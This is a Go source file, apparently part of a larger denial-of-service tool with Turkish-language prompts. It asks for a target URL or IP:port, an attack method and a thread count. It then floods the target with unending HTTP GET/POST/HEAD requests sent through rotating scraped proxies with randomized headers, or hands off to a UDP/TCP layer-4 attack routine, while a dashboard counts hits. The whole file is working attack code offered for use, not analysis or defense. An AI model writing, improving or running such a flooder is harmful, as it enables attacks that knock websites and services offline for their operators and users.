package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	reqSent uint64
	success uint64
	fails   uint64
)

func main() {
	PrintBanner()
	ScrapeProxies()

	var target, method string
	var threads int

	fmt.Print("\033[33m[?]\033[0m HEDEF (URL veya IP:Port): ")
	fmt.Scan(&target)

	fmt.Print("\033[33m[?]\033[0m METOT (GET/POST/HEAD/UDP/TCP): ")
	fmt.Scan(&method)
	method = strings.ToUpper(method)

	fmt.Print("\033[33m[?]\033[0m GÜÇ (Thread Sayısı): ")
	fmt.Scan(&threads)

	go ShowDashboard()

	var wg sync.WaitGroup

	if method == "UDP" || method == "TCP" {
		StartL4Attack(target, method, threads)
	} else if method == "GET" || method == "POST" || method == "HEAD" {
		for i := 0; i < threads; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					if len(proxies) == 0 {
						time.Sleep(1 * time.Second)
						continue
					}

					mu.RLock()
					pAddr := "http://" + proxies[time.Now().UnixNano()%int64(len(proxies))]
					mu.RUnlock()

					client, err := CreateSmartClient(pAddr)
					if err != nil {
						atomic.AddUint64(&fails, 1)
						continue
					}

					req, err := http.NewRequest(method, target, nil)
					if err != nil {
						atomic.AddUint64(&fails, 1)
						continue
					}

					headers := GetRandomHeaders()
					for k, v := range headers {
						req.Header.Set(k, v)
					}

					resp, err := client.Do(req)
					atomic.AddUint64(&reqSent, 1)

					if err == nil {
						atomic.AddUint64(&success, 1)
						resp.Body.Close()
					} else {
						atomic.AddUint64(&fails, 1)
					}
				}
			}()
		}
	} else {
		fmt.Println("\033[31m[!]\033[0m Hata: Gecersiz metot.")
		os.Exit(1)
	}

	wg.Wait()
	select {}
}

func PrintBanner() {
	fmt.Print("\033[H\033[2J")
	fmt.Println("\033[36m")
	fmt.Println("  ███╗   ██╗███████╗██████╗  █████╗  ██████╗ ")
	fmt.Println("  ████╗  ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗")
	fmt.Println("  ██╔██╗ ██║███████╗██████╔╝███████║██║   ██║")
	fmt.Println("  ██║╚██╗██║╚════██║██╔═══╝ ██╔══██║██║▄▄ ██║")
	fmt.Println("  ██║ ╚████║███████║██║     ██║  ██║╚██████╔╝")
	fmt.Println("  ╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ \033[1.0-PRO\033[0m")
	fmt.Println("\033[37m  ----------------------------------------------")
	fmt.Println("  [ Multi-Method: Active ] | [ HTTP/2 & L4 Support ]")
	fmt.Println("  ----------------------------------------------\033[0m")
}
